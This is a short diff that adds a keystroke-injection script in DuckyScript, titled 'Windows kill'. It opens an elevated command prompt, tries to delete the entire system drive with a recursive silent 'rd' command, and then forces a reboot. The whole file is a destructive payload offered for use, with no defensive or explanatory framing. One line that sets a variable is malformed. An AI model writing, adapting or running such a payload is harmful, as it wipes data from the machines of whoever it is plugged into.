@@ -1,0 +1,16 @@
+REM Windows kill by Russanandres v1.0
+
+GUI r
+DELAY 500
+STRING powershell Start-Process cmd -verb runAs
+DELAY 500
+ENTER
+DELAY 2500
+STRING set %sd%=%systemdrive%
+ENTER
+DELAY 500
+STRING rd %sd%\ /s /q
+ENTER
+DELAY 5000
+STRING shutdown /r /t 1
+ENTER
